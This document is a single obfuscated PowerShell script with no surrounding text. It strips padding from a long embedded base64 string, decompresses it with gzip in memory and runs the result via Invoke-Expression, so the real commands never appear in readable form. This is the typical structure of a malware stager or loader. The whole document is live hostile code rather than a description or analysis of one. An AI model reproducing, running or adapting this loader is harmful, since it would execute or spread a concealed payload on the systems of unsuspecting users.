$d61="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plGWBtCP";$40d=[Convert]::FromBase64String($d61.Substring(31,$d61.Length-31-8));$07e=New-Object IO.MemoryStream(,$40d);$bfa0=New-Object IO.Compression.GZipStream($07e,[IO.Compression.CompressionMode]::Decompress);$ad1=New-Object IO.StreamReader($bfa0);iex $ad1.ReadToEnd()